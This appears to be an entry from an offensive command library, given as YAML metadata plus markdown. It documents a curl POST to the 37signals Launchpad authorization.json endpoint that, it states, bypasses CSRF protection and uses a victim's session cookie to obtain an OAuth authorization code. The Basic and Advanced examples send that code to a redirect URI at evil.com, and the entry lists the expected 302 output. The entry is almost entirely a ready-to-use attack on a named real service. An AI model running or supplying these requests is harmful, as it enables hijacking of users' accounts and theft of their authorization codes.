---
id: cmd-37signals-post-auth-json-001
data: >-
  curl -X POST https://launchpad.37signals.com/authorization.json -H
  "Content-Type: application/x-www-form-urlencoded" -H "Cookie:
  _beanstalk_uuid=victim-session" -d
  "client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit="
tags:
  - csrf
  - oauth2
  - http-post
type: command
output: 'HTTP/1.1 302 Found\nLocation: {redirect_uri}?code={auth-code}'
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.301Z'
verified: false
validated: true
submitted: true
---
# post-authorization-json

## Command

```bash
curl -X POST https://launchpad.37signals.com/authorization.json \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: _beanstalk_uuid=victim-session" \
  -d "client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit="
```

## Description

Sends a POST request to the authorization endpoint in .json format to bypass CSRF protection and obtain an authorization code using the victim's session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| client_id | The client ID of the third-party application | Yes |
| type | OAuth flow type (web_server) | Yes |
| redirect_uri | Callback URL for the authorization code | Yes |
| commit | Form submission trigger | Yes |
| Cookie | Victim's session cookie (_beanstalk_uuid) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://launchpad.37signals.com/authorization.json \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=abc123&type=web_server&redirect_uri=https://evil.com/callback&commit="
```

### Advanced Usage

Include full headers for realism:

```bash
curl -X POST https://launchpad.37signals.com/authorization.json \
  -H "User-Agent: Mozilla/5.0" \
  -H "Cookie: _beanstalk_uuid=def456" \
  -d "client_id=abc123&type=web_server&redirect_uri=https://evil.com/callback&commit="
```

## Expected Output

Redirect (302) to redirect_uri with ?code= appended, e.g., Location: https://evil.com/callback?code=xyz789.

## Related

- [[commands/post-authorization-token]]
- [[procedures/Submit-Malicious-Authorization-Request-via-CSRF]]
